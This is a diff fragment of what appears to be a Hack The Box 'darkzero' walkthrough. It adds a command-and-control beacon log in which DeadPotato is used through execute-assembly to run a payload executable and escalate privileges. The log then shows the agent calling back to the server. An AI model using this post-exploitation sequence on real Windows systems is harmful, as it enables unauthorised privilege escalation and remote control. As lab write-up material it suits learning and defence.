@@ -809,3 +809,10 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 
 This now gives me a higher privilege beacon
 
+```python
+[20/08 21:49:04] ethan [1e71669a] beacon > execute-assembly /home/kali/htb/darkzero/DeadPotato-NET4.exe -cmd "C:\Temp\http.x64.exe"
+[20/08 21:49:04] [*] Task: execute .NET assembly
+[20/08 21:49:07] [*] Agent called server, sent [2.27 Mb]
+```
+
+Now in this higher privilege beacon ill use deadpotato to re-execute
